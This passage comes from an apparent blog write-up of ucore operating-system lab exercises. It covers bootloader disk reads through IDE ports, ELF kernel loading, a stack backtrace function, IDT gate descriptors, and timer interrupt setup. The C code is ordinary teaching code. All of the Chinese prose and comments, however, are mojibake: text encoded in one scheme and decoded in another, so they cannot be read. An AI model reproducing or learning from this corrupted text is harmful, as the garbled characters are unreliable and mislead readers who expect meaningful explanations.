IOï¼‰æ–¹å¼ï¼Œå³æ‰€æœ‰çš„IOæ“ä½œæ˜¯é€šè¿‡CPUè®¿é—®ç¡¬ç›˜çš„IOåœ°å€å¯„å­˜å™¨å®Œæˆã€‚</p><p>ä¸€èˆ¬ä¸»æ¿æœ‰2ä¸ªIDEé€šé“ï¼Œæ¯ä¸ªé€šé“å¯ä»¥æ¥2ä¸ªIDEç¡¬ç›˜ã€‚è®¿é—®ç¬¬ä¸€ä¸ªç¡¬ç›˜çš„æ‰‡åŒºå¯è®¾ç½®IOåœ°å€å¯„å­˜å™¨0x1f0-0x1f7å®ç°çš„ï¼Œå…·ä½“å‚æ•°è§ä¸‹è¡¨ã€‚ä¸€èˆ¬ç¬¬ä¸€ä¸ªIDEé€šé“é€šè¿‡è®¿é—®IOåœ°å€0x1f0-0x1f7æ¥å®ç°ï¼Œç¬¬äºŒä¸ªIDEé€šé“é€šè¿‡è®¿é—®0x170-0x17få®ç°ã€‚æ¯ä¸ªé€šé“çš„ä¸»ä»ç›˜çš„é€‰æ‹©é€šè¿‡ç¬¬6ä¸ªIOåç§»åœ°å€å¯„å­˜å™¨æ¥è®¾ç½®ã€‚</p><table><thead><tr><th>IOåœ°å€</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>0x1f0</td><td>è¯»æ•°æ®ï¼Œå½“0x1f7ä¸ä¸ºå¿™çŠ¶æ€æ—¶ï¼Œå¯ä»¥è¯»ã€‚</td></tr><tr><td>0x1f2</td><td>è¦è¯»å†™çš„æ‰‡åŒºæ•°ï¼Œæ¯æ¬¡è¯»å†™å‰ï¼Œä½ éœ€è¦è¡¨æ˜ä½ è¦è¯»å†™å‡ ä¸ªæ‰‡åŒºã€‚æœ€å°æ˜¯1ä¸ªæ‰‡åŒº</td></tr><tr><td>0x1f3</td><td>å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„0-7ä½</td></tr><tr><td>0x1f4</td><td>å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„8-15ä½</td></tr><tr><td>0x1f5</td><td>å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„16-23ä½</td></tr><tr><td>0x1f6</td><td>ç¬¬0~3ä½ï¼šå¦‚æœæ˜¯LBAæ¨¡å¼å°±æ˜¯24-27ä½ ç¬¬4ä½ï¼šä¸º0ä¸»ç›˜ï¼›ä¸º1ä»ç›˜</td></tr><tr><td>0x1f7</td><td>çŠ¶æ€å’Œå‘½ä»¤å¯„å­˜å™¨ã€‚æ“ä½œæ—¶å…ˆç»™å‘½ä»¤ï¼Œå†è¯»å–ï¼Œå¦‚æœä¸æ˜¯å¿™çŠ¶æ€å°±ä»0x1f0ç«¯å£è¯»æ•°æ®</td></tr></tbody></table><p>å½“å‰ ç¡¬ç›˜æ•°æ®æ˜¯å‚¨å­˜åˆ°ç¡¬ç›˜æ‰‡åŒºä¸­ï¼Œä¸€ä¸ªæ‰‡åŒºå¤§å°ä¸º512å­—èŠ‚ã€‚è¯»ä¸€ä¸ªæ‰‡åŒºçš„æµç¨‹ï¼ˆå¯å‚çœ‹boot/bootmain.cä¸­çš„readsectå‡½æ•°å®ç°ï¼‰å¤§è‡´å¦‚ä¸‹ï¼š</p><ol><li>ç­‰å¾…ç£ç›˜å‡†å¤‡å¥½</li><li>å‘å‡ºè¯»å–æ‰‡åŒºçš„å‘½ä»¤</li><li>ç­‰å¾…ç£ç›˜å‡†å¤‡å¥½</li><li>æŠŠç£ç›˜æ‰‡åŒºæ•°æ®è¯»åˆ°æŒ‡å®šå†…å­˜</li></ol><p><strong>åˆ†æbootloaderåŠ è½½ELFæ ¼å¼çš„OSçš„è¿‡ç¨‹ã€‚</strong> </p><p>é¦–å…ˆçœ‹readsectå‡½æ•°ï¼Œ<br><code>readsect</code>ä»è®¾å¤‡çš„ç¬¬secnoæ‰‡åŒºè¯»å–æ•°æ®åˆ°dstä½ç½®</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">readsect</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *dst, <span class="hljs-keyword">uint32_t</span> secno)</span> </span>&#123;<br>    waitdisk();<br><br>    outb(<span class="hljs-number">0x1F2</span>, <span class="hljs-number">1</span>);                         <span class="hljs-comment">// è®¾ç½®è¯»å–æ‰‡åŒºçš„æ•°ç›®ä¸º1</span><br>    outb(<span class="hljs-number">0x1F3</span>, secno &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F4</span>, (secno &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F5</span>, (secno &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F6</span>, ((secno &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xF</span>) | <span class="hljs-number">0xE0</span>);<br>        <span class="hljs-comment">// ä¸Šé¢å››æ¡æŒ‡ä»¤è”åˆåˆ¶å®šäº†æ‰‡åŒºå·</span><br>        <span class="hljs-comment">// åœ¨è¿™4ä¸ªå­—èŠ‚çº¿è”åˆæ„æˆçš„32ä½å‚æ•°ä¸­</span><br>        <span class="hljs-comment">//   29-31ä½å¼ºåˆ¶è®¾ä¸º1</span><br>        <span class="hljs-comment">//   28ä½(=0)è¡¨ç¤ºè®¿é—®&quot;Disk 0&quot;</span><br>        <span class="hljs-comment">//   0-27ä½æ˜¯28ä½çš„åç§»é‡</span><br>    outb(<span class="hljs-number">0x1F7</span>, <span class="hljs-number">0x20</span>);                      <span class="hljs-comment">// 0x20å‘½ä»¤ï¼Œè¯»å–æ‰‡åŒº</span><br><br>    waitdisk();<br><br>    insl(<span class="hljs-number">0x1F0</span>, dst, SECTSIZE / <span class="hljs-number">4</span>);         <span class="hljs-comment">// è¯»å–åˆ°dstä½ç½®ï¼Œ</span><br>                                            <span class="hljs-comment">// magic number = 4å› ä¸ºè¿™é‡Œä»¥DWä¸ºå•ä½</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>readsegç®€å•åŒ…è£…äº†readsectï¼Œå¯ä»¥ä»è®¾å¤‡è¯»å–ä»»æ„é•¿åº¦çš„å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">readseg</span><span class="hljs-params">(<span class="hljs-keyword">uintptr_t</span> va, <span class="hljs-keyword">uint32_t</span> count, <span class="hljs-keyword">uint32_t</span> offset)</span> </span>&#123;<br>    <span class="hljs-keyword">uintptr_t</span> end_va = va + count;<br><br>    va -= offset % SECTSIZE;<br><br>    <span class="hljs-keyword">uint32_t</span> secno = (offset / SECTSIZE) + <span class="hljs-number">1</span>; <br>    <span class="hljs-comment">// åŠ 1å› ä¸º0æ‰‡åŒºè¢«å¼•å¯¼å ç”¨</span><br>    <span class="hljs-comment">// ELFæ–‡ä»¶ä»1æ‰‡åŒºå¼€å§‹</span><br><br>    <span class="hljs-keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno ++) &#123;<br>        readsect((<span class="hljs-keyword">void</span> *)va, secno);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>åœ¨bootmainå‡½æ•°ä¸­ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">bootmain</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// é¦–å…ˆè¯»å–ELFçš„å¤´éƒ¨</span><br>    readseg((<span class="hljs-keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// é€šè¿‡å‚¨å­˜åœ¨å¤´éƒ¨çš„å¹»æ•°åˆ¤æ–­æ˜¯å¦æ˜¯åˆæ³•çš„ELFæ–‡ä»¶</span><br>    <span class="hljs-keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;<br>        <span class="hljs-keyword">goto</span> bad;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proghdr</span> *<span class="hljs-title">ph</span>, *<span class="hljs-title">eph</span>;</span><br><br>    <span class="hljs-comment">// ELFå¤´éƒ¨æœ‰æè¿°ELFæ–‡ä»¶åº”åŠ è½½åˆ°å†…å­˜ä»€ä¹ˆä½ç½®çš„æè¿°è¡¨ï¼Œ</span><br>    <span class="hljs-comment">// å…ˆå°†æè¿°è¡¨çš„å¤´åœ°å€å­˜åœ¨ph</span><br>    ph = (struct proghdr *)((<span class="hljs-keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);<br>    eph = ph + ELFHDR-&gt;e_phnum;<br><br>    <span class="hljs-comment">// æŒ‰ç…§æè¿°è¡¨å°†ELFæ–‡ä»¶ä¸­æ•°æ®è½½å…¥å†…å­˜</span><br>    <span class="hljs-keyword">for</span> (; ph &lt; eph; ph ++) &#123;<br>        readseg(ph-&gt;p_va &amp; <span class="hljs-number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);<br>    &#125;<br>    <span class="hljs-comment">// ELFæ–‡ä»¶0x1000ä½ç½®åé¢çš„0xd1ecæ¯”ç‰¹è¢«è½½å…¥å†…å­˜0x00100000</span><br>    <span class="hljs-comment">// ELFæ–‡ä»¶0xf000ä½ç½®åé¢çš„0x1d20æ¯”ç‰¹è¢«è½½å…¥å†…å­˜0x0010e000</span><br><br>    <span class="hljs-comment">// æ ¹æ®ELFå¤´éƒ¨å‚¨å­˜çš„å…¥å£ä¿¡æ¯ï¼Œæ‰¾åˆ°å†…æ ¸çš„å…¥å£</span><br>    ((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="hljs-number">0xFFFFFF</span>))();<br><br>bad:<br>    outw(<span class="hljs-number">0x8A00</span>, <span class="hljs-number">0x8A00</span>);<br>    outw(<span class="hljs-number">0x8A00</span>, <span class="hljs-number">0x8E00</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="ç»ƒä¹ äº”"><a href="#ç»ƒä¹ äº”" class="headerlink" title="ç»ƒä¹ äº”"></a>ç»ƒä¹ äº”</h3><blockquote><p>å®ç°å‡½æ•°è°ƒç”¨å †æ ˆè·Ÿè¸ªå‡½æ•°</p></blockquote><p class="note note-primary"style="font-style:italic;background-color:rgb(240,230,250)">å‘ç°å¹¶æ²¡æœ‰åœ¨è¿™é‡Œæåˆ°stabsç±»å‹æ–‡ä»¶, è¡¥å……ä¸€ä¸‹</p><ul><li>Stabs refers to a format for information that describes a program to a debugger</li><li>This debugging information describes features of the source file like <u>line numbsers, the types and scopes of variables, and function names, parameters, and scopes.</u> </li><li>generated by compiler into the â€˜.sâ€™ file</li><li><a href="https://www.sourceware.org/gdb/onlinedocs/stabs.pdf">documentation</a> </li></ul><p>ss:ebpæŒ‡å‘çš„å †æ ˆä½ç½®å‚¨å­˜ç€callerçš„ebpï¼Œä»¥æ­¤ä¸ºçº¿ç´¢å¯ä»¥å¾—åˆ°æ‰€æœ‰ä½¿ç”¨å †æ ˆçš„å‡½æ•°ebpã€‚<br>ss:ebp+4æŒ‡å‘callerè°ƒç”¨æ—¶çš„eipï¼Œss:ebp+8ç­‰æ˜¯ï¼ˆå¯èƒ½çš„ï¼‰å‚æ•°ã€‚</p><p>è¾“å‡ºä¸­ï¼Œå †æ ˆæœ€æ·±ä¸€å±‚ä¸º</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">ebp:<span class="hljs-number">0x00007bf8</span> eip:<span class="hljs-number">0x00007d68</span> args:<span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00007c4f</span><br>    &lt;unknow&gt;: -- <span class="hljs-number">0x00007d67</span> --<br></code></pre></div></td></tr></table></figure><p>å…¶å¯¹åº”çš„æ˜¯ç¬¬ä¸€ä¸ªä½¿ç”¨å †æ ˆçš„å‡½æ•°ï¼Œbootmain.cä¸­çš„bootmainã€‚<br>bootloaderè®¾ç½®çš„å †æ ˆä»0x7c00å¼€å§‹ï¼Œä½¿ç”¨â€call bootmainâ€è½¬å…¥bootmainå‡½æ•°ã€‚<br>callæŒ‡ä»¤å‹æ ˆï¼Œæ‰€ä»¥bootmainä¸­ebpä¸º0x7bf8ã€‚</p><p><strong>print_stackframe:</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">+|  æ ˆåº•æ–¹å‘    | é«˜ä½åœ°å€</span><br><span class="hljs-comment"> |    ...       |</span><br><span class="hljs-comment"> |    ...       |</span><br><span class="hljs-comment"> |  å‚æ•°3       |</span><br><span class="hljs-comment"> |  å‚æ•°2       |</span><br><span class="hljs-comment"> |  å‚æ•°1       |</span><br><span class="hljs-comment"> |  è¿”å›åœ°å€     |</span><br><span class="hljs-comment"> |  ä¸Šä¸€å±‚[ebp]  | &lt;-------- [ebp]</span><br><span class="hljs-comment"> |  å±€éƒ¨å˜é‡     |  ä½ä½åœ°å€</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">uint32_t</span> eip, ebp;<br>eip = read_eip();<br>ebp = read_ebp();<br><span class="hljs-keyword">int</span> i, j;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ebp != <span class="hljs-number">0</span> &amp;&amp; i &lt; STACKFRAME_DEPTH; i++)<br>&#123;<br>    cprintf(<span class="hljs-string">&quot;ebp:0x%08x eip:0x%08x args:&quot;</span>, ebp, eip);<br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>    &#123;<br>        cprintf(<span class="hljs-string">&quot;0x%08x &quot;</span>, ((<span class="hljs-keyword">uint32_t</span> *)ebp + <span class="hljs-number">2</span>)[j]);<br>    &#125;<br>    cprintf(<span class="hljs-string">&quot;\n&quot;</span>);<br>    print_debuginfo(eip - <span class="hljs-number">1</span>);<br>    eip = ((<span class="hljs-keyword">uint32_t</span> *)ebp)[<span class="hljs-number">1</span>];<br>    ebp = ((<span class="hljs-keyword">uint32_t</span> *)ebp)[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„é—®é¢˜:</p><ul><li><p>gdbå‘½ä»¤é€šè¿‡æ–‡ä»¶åŠ è½½debuginfo, åŒ…æ‹¬æºä»£ç å’Œå‡½æ•°ä½ç½®, ä¸€èˆ¬æˆ‘ä»¬ç›´æ¥ä½¿ç”¨gdb <em>filepath</em> -qç›´æ¥è¿›å…¥è°ƒè¯•ç•Œé¢, è€Œæœ¬å®éªŒå…ˆå¯åŠ¨qemu(ä½¿ç”¨.imgé•œåƒæ–‡ä»¶), ç„¶ågdbé€šè¿‡remoteè¿æ¥åˆ°qemuä¸­, Makefileä¸­æŒ‡å®šçš„gdbinitæ–‡ä»¶å¯ä»¥æŒ‡å®šä¸€äº›åˆå§‹å‘½ä»¤.</p><p>è¿™æ ·, gdbæ²¡æœ‰ä»»ä½•debuginfo, å…¨é è¿œç¨‹ç«¯å£ç»™å‡ºä¿¡æ¯, æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨initæ–‡ä»¶ä¸­æ·»åŠ fileå‘½ä»¤åŠ è½½ç¬¦å·ä¿¡æ¯</p></li></ul><h3 id="ç»ƒä¹ å…­"><a href="#ç»ƒä¹ å…­" class="headerlink" title="ç»ƒä¹ å…­"></a>ç»ƒä¹ å…­</h3><blockquote><p>å®Œå–„ä¸­æ–­åˆå§‹åŒ–å’Œå¤„ç†</p></blockquote><ul><li><p>ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆä¹Ÿå¯ç®€ç§°ä¸ºä¿æŠ¤æ¨¡å¼ä¸‹çš„ä¸­æ–­å‘é‡è¡¨ï¼‰ä¸­ä¸€ä¸ªè¡¨é¡¹å å¤šå°‘å­—èŠ‚ï¼Ÿå…¶ä¸­å“ªå‡ ä½ä»£è¡¨ä¸­æ–­å¤„ç†ä»£ç çš„å…¥å£ï¼Ÿ</p><ul><li><p>ä¸€ä¸ªè¡¨é¡¹çš„ç»“æ„å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Gate descriptors for interrupts and traps */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gatedesc</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> gd_off_15_0 : <span class="hljs-number">16</span>;        <span class="hljs-comment">// low 16 bits of offset in segment</span><br>    <span class="hljs-keyword">unsigned</span> gd_ss : <span class="hljs-number">16</span>;            <span class="hljs-comment">// segment selector</span><br>    <span class="hljs-keyword">unsigned</span> gd_args : <span class="hljs-number">5</span>;            <span class="hljs-comment">// # args, 0 for interrupt/trap gates</span><br>    <span class="hljs-keyword">unsigned</span> gd_rsv1 : <span class="hljs-number">3</span>;            <span class="hljs-comment">// reserved(should be zero I guess)</span><br>    <span class="hljs-keyword">unsigned</span> gd_type : <span class="hljs-number">4</span>;            <span class="hljs-comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span><br>    <span class="hljs-keyword">unsigned</span> gd_s : <span class="hljs-number">1</span>;                <span class="hljs-comment">// must be 0 (system)</span><br>    <span class="hljs-keyword">unsigned</span> gd_dpl : <span class="hljs-number">2</span>;            <span class="hljs-comment">// descriptor(meaning new) privilege level</span><br>    <span class="hljs-keyword">unsigned</span> gd_p : <span class="hljs-number">1</span>;                <span class="hljs-comment">// Present</span><br>    <span class="hljs-keyword">unsigned</span> gd_off_31_16 : <span class="hljs-number">16</span>;        <span class="hljs-comment">// high bits of offset in segment</span><br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>è¯¥è¡¨é¡¹çš„å¤§å°ä¸º<code>16+16+5+3+4+1+2+1+16 == 8*8</code>bitï¼Œå³<strong>8å­—èŠ‚</strong>ã€‚</p></li><li><p>æ ¹æ®IDTè¡¨é¡¹çš„ç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼ŒIDTè¡¨é¡¹çš„ç¬¬äºŒä¸ªæˆå‘˜<code>gd_ss</code>ä¸ºæ®µé€‰æ‹©å­ï¼Œç¬¬ä¸€ä¸ªæˆå‘˜<code>gd_off_15_0</code>å’Œæœ€åä¸€ä¸ªæˆå‘˜<code>gd_off_31_16</code>å…±åŒç»„æˆä¸€ä¸ªæ®µå†…åç§»åœ°å€ã€‚æ ¹æ®æ®µé€‰æ‹©å­å’Œæ®µå†…åç§»åœ°å€å°±å¯ä»¥å¾—å‡ºä¸­æ–­å¤„ç†ç¨‹åºçš„åœ°å€ã€‚</p></li></ul></li><li><p>ç¼–ç¨‹å®Œå–„kern/trap/trap.cä¸­å¯¹ä¸­æ–­å‘é‡è¡¨è¿›è¡Œåˆå§‹åŒ–çš„å‡½æ•°idt_init.</p><ul><li><p>å…·ä½“å®ç°å¦‚ä¸‹ï¼Œè¯¦ç»†ä¿¡æ¯ä»¥æ³¨é‡Šçš„å½¢å¼å†™å…¥ä»£ç ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">idt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-comment">// __vectorså®šä¹‰äºvector.Sä¸­</span><br>  <span class="hljs-keyword">extern</span> <span class="hljs-keyword">uintptr_t</span> __vectors[];<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(idt) / <span class="hljs-keyword">sizeof</span>(struct gatedesc); i ++)<br>      <span class="hljs-comment">// ç›®æ ‡idté¡¹ä¸ºidt[i]</span><br>      <span class="hljs-comment">// è¯¥idté¡¹ä¸ºå†…æ ¸ä»£ç ï¼Œæ‰€ä»¥ä½¿ç”¨GD_KTEXTæ®µé€‰æ‹©å­</span><br>      <span class="hljs-comment">// ä¸­æ–­å¤„ç†ç¨‹åºçš„å…¥å£åœ°å€å­˜æ”¾äº__vectors[i]</span><br>      <span class="hljs-comment">// ç‰¹æƒçº§ä¸ºDPL_KERNEL</span><br>      SETGATE(idt[i], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);<br>  <span class="hljs-comment">// è®¾ç½®ä»ç”¨æˆ·æ€è½¬ä¸ºå†…æ ¸æ€çš„ä¸­æ–­çš„ç‰¹æƒçº§ä¸ºDPL_USER</span><br>  <span class="hljs-comment">// å¥½åƒå°±æ˜¯int 0x80, ä¸è¿‡æˆ‘æ²¡æœ‰åœ¨ä»»ä½•åœ°æ–¹çœ‹åˆ°è¯´æ˜, å°è¯•è‡ªå·±å†™è¿™ä¸€æ®µä»£ç èŠ±äº†å¥½å¤šæ— è°“çš„æ—¶é—´</span><br>  SETGATE(idt[T_SWITCH_TOK], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);<br>  <span class="hljs-comment">// åŠ è½½è¯¥IDT</span><br>  lidt(&amp;idt_pd);<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>ç¼–ç¨‹å®Œå–„trap.cä¸­çš„ä¸­æ–­å¤„ç†å‡½æ•°trap_dispatch**(called by trap(), and trap() called in trapentry.S)**ï¼Œåœ¨å¯¹æ—¶é’Ÿä¸­æ–­è¿›è¡Œå¤„ç†çš„éƒ¨åˆ†å¡«å†™trapå‡½æ•°ä¸­å¤„ç†æ—¶é’Ÿä¸­æ–­çš„éƒ¨åˆ†ï¼Œä½¿æ“ä½œç³»ç»Ÿæ¯é‡åˆ°100æ¬¡æ—¶é’Ÿä¸­æ–­åï¼Œè°ƒç”¨print_tickså­ç¨‹åºï¼Œå‘å±å¹•ä¸Šæ‰“å°ä¸€è¡Œæ–‡å­—â€100 ticksâ€ã€‚</p><ul><li><p>è¿™ä¸ªå®ç°è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œæ³¨é‡Šéƒ½è¯´æ¸…æ¥šäº†</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">case</span> IRQ_OFFSET + IRQ_TIMER:        <span class="hljs-comment">// å…¨å±€å˜é‡tickså®šä¹‰äºkern/driver/clock.c</span><br>ticks++;       <br><span class="hljs-keyword">if</span>(ticks % TICK_NUM == <span class="hljs-number">0</span>)            <br>        print_ticks();        <br><span class="hljs-keyword">break</span>;    <span class="hljs-comment">// .........</span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>ç»“æœ:</p></li></ul><img src="https://i.loli.net/2021/11/20/n8cShiWkulDqzpP.png" alt="image-20211120131815160" style="zoom:80%;" /><h3 id="æ‹“å±•ç»ƒä¹ "><a href="#æ‹“å±•ç»ƒä¹ " class="headerlink" title="æ‹“å±•ç»ƒä¹ "></a>æ‹“å±•ç»ƒä¹ </h3><blockquote><p>Challenge 1: æ‰©å±•proj4,å¢åŠ syscallåŠŸèƒ½ï¼Œå³å¢åŠ ä¸€ç”¨æˆ·æ€å‡½æ•°ï¼ˆå¯æ‰§è¡Œä¸€ç‰¹å®šç³»ç»Ÿè°ƒç”¨ï¼šè·å¾—æ—¶é’Ÿè®¡æ•°å€¼ï¼‰ï¼Œå½“å†…æ ¸åˆå§‹å®Œæ¯•åï¼Œå¯ä»å†…æ ¸æ€è¿”å›åˆ°ç”¨æˆ·æ€çš„å‡½æ•°ï¼Œè€Œç”¨æˆ·æ€çš„å‡½æ•°åˆé€šè¿‡ç³»ç»Ÿè°ƒç”¨å¾—åˆ°å†…æ ¸æ€çš„æœåŠ¡</p></blockquote><p>è¯¦è§çŸ¥è¯†ç‚¹</p><blockquote><p>Challenge 2:ç”¨é”®ç›˜å®ç°ç”¨æˆ·æ¨¡å¼å†…æ ¸æ¨¡å¼åˆ‡æ¢ã€‚å…·ä½“ç›®æ ‡æ˜¯ï¼šâ€œé”®ç›˜è¾“å…¥3æ—¶åˆ‡æ¢åˆ°ç”¨æˆ·æ¨¡å¼ï¼Œé”®ç›˜è¾“å…¥0æ—¶åˆ‡æ¢åˆ°å†…æ ¸æ¨¡å¼â€ã€‚ åŸºæœ¬æ€è·¯æ˜¯å€Ÿé‰´è½¯ä¸­æ–­(syscallåŠŸèƒ½)çš„ä»£ç ï¼Œå¹¶ä¸”æŠŠtrap.cä¸­è½¯ä¸­æ–­å¤„ç†çš„è®¾ç½®è¯­å¥æ‹¿è¿‡æ¥ã€‚</p></blockquote><h1 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h1><h2 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="1-æ¢æµ‹ç³»ç»Ÿç‰©ç†å†…å­˜å¸ƒå±€"><a href="#1-æ¢æµ‹ç³»ç»Ÿç‰©ç†å†…å­˜å¸ƒå±€" class="headerlink" title="1.æ¢æµ‹ç³»ç»Ÿç‰©ç†å†…å­˜å¸ƒå±€"></a>1.æ¢æµ‹ç³»ç»Ÿç‰©ç†å†…å­˜å¸ƒå±€</h3><ul><li>å½“ ucore 